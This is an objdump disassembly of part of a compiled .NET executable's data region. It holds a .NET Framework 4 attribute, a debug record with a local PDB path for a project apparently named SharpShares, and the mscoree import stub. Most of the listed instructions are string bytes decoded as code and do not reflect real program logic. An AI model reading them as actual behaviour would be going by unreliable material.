  40419a:	00 54 0e 14          	add    %dl,0x14(%esi,%ecx,1)
  40419e:	46                   	inc    %esi
  40419f:	72 61                	jb     0x404202
  4041a1:	6d                   	insl   (%dx),%es:(%edi)
  4041a2:	65 77 6f             	gs ja  0x404214
  4041a5:	72 6b                	jb     0x404212
  4041a7:	44                   	inc    %esp
  4041a8:	69 73 70 6c 61 79 4e 	imul   $0x4e79616c,0x70(%ebx),%esi
  4041af:	61                   	popa
  4041b0:	6d                   	insl   (%dx),%es:(%edi)
  4041b1:	65 10 2e             	adc    %ch,%gs:(%esi)
  4041b4:	4e                   	dec    %esi
  4041b5:	45                   	inc    %ebp
  4041b6:	54                   	push   %esp
  4041b7:	20 46 72             	and    %al,0x72(%esi)
  4041ba:	61                   	popa
  4041bb:	6d                   	insl   (%dx),%es:(%edi)
  4041bc:	65 77 6f             	gs ja  0x40422e
  4041bf:	72 6b                	jb     0x40422c
  4041c1:	20 34 00             	and    %dh,(%eax,%eax,1)
  4041c4:	00 00                	add    %al,(%eax)
  4041c6:	00 00                	add    %al,(%eax)
  4041c8:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  4041c9:	6f                   	outsl  %ds:(%esi),(%dx)
  4041ca:	47                   	inc    %edi
  4041cb:	ef                   	out    %eax,(%dx)
  4041cc:	00 00                	add    %al,(%eax)
  4041ce:	00 00                	add    %al,(%eax)
  4041d0:	02 00                	add    (%eax),%al
  4041d2:	00 00                	add    %al,(%eax)
  4041d4:	74 00                	je     0x4041d6
  4041d6:	00 00                	add    %al,(%eax)
  4041d8:	fc                   	cld
  4041d9:	41                   	inc    %ecx
  4041da:	00 00                	add    %al,(%eax)
  4041dc:	fc                   	cld
  4041dd:	23 00                	and    (%eax),%eax
	...
  4041eb:	00 10                	add    %dl,(%eax)
	...
  4041f9:	00 00                	add    %al,(%eax)
  4041fb:	00 52 53             	add    %dl,0x53(%edx)
  4041fe:	44                   	inc    %esp
  4041ff:	53                   	push   %ebx
  404200:	f0 95                	lock xchg %eax,%ebp
  404202:	5b                   	pop    %ebx
  404203:	9c                   	pushf
  404204:	9f                   	lahf
  404205:	13 84 44 b8 07 b4 17 	adc    0x17b407b8(%esp,%eax,2),%eax
  40420c:	76 83                	jbe    0x404191
  40420e:	21 d0                	and    %edx,%eax
  404210:	01 00                	add    %eax,(%eax)
  404212:	00 00                	add    %al,(%eax)
  404214:	43                   	inc    %ebx
  404215:	3a 5c 55 73          	cmp    0x73(%ebp,%edx,2),%bl
  404219:	65 72 73             	gs jb  0x40428f
  40421c:	5c                   	pop    %esp
  40421d:	58                   	pop    %eax
  40421e:	75 61                	jne    0x404281
  404220:	6e                   	outsb  %ds:(%esi),(%dx)
  404221:	4a                   	dec    %edx
  404222:	69 61 6e 5c 44 65 73 	imul   $0x7365445c,0x6e(%ecx),%esp
  404229:	6b 74 6f 70 5c       	imul   $0x5c,0x70(%edi,%ebp,2),%esi
  40422e:	53                   	push   %ebx
  40422f:	68 61 72 70 53       	push   $0x53707261
  404234:	68 61 72 65 73       	push   $0x73657261
  404239:	2d 6d 61 73 74       	sub    $0x7473616d,%eax
  40423e:	65 72 5c             	gs jb  0x40429d
  404241:	53                   	push   %ebx
  404242:	68 61 72 70 53       	push   $0x53707261
  404247:	68 61 72 65 73       	push   $0x73657261
  40424c:	2d 6d 61 73 74       	sub    $0x7473616d,%eax
  404251:	65 72 5c             	gs jb  0x4042b0
  404254:	6f                   	outsl  %ds:(%esi),(%dx)
  404255:	62 6a 5c             	bound  %ebp,0x5c(%edx)
  404258:	52                   	push   %edx
  404259:	65 6c                	gs insb (%dx),%es:(%edi)
  40425b:	65 61                	gs popa
  40425d:	73 65                	jae    0x4042c4
  40425f:	5c                   	pop    %esp
  404260:	53                   	push   %ebx
  404261:	68 61 72 70 53       	push   $0x53707261
  404266:	68 61 72 65 73       	push   $0x73657261
  40426b:	2e 70 64             	jo,pn  0x4042d2
  40426e:	62 00                	bound  %eax,(%eax)
  404270:	98                   	cwtl
  404271:	42                   	inc    %edx
	...
  40427a:	00 00                	add    %al,(%eax)
  40427c:	b2 42                	mov    $0x42,%dl
  40427e:	00 00                	add    %al,(%eax)
  404280:	00 20                	add    %ah,(%eax)
	...
  404296:	00 00                	add    %al,(%eax)
  404298:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  404299:	42                   	inc    %edx
	...
  4042a6:	5f                   	pop    %edi
  4042a7:	43                   	inc    %ebx
  4042a8:	6f                   	outsl  %ds:(%esi),(%dx)
  4042a9:	72 45                	jb     0x4042f0
  4042ab:	78 65                	js     0x404312
  4042ad:	4d                   	dec    %ebp
  4042ae:	61                   	popa
  4042af:	69 6e 00 6d 73 63 6f 	imul   $0x6f63736d,0x0(%esi),%ebp
  4042b6:	72 65                	jb     0x40431d
  4042b8:	65 2e 64 6c          	gs cs fs insb (%dx),%es:(%edi)
  4042bc:	6c                   	insb   (%dx),%es:(%edi)
  4042bd:	00 00                	add    %al,(%eax)
  4042bf:	00 00                	add    %al,(%eax)
  4042c1:	00 ff                	add    %bh,%bh
  4042c3:	25 00 20 40 00       	and    $0x402000,%eax
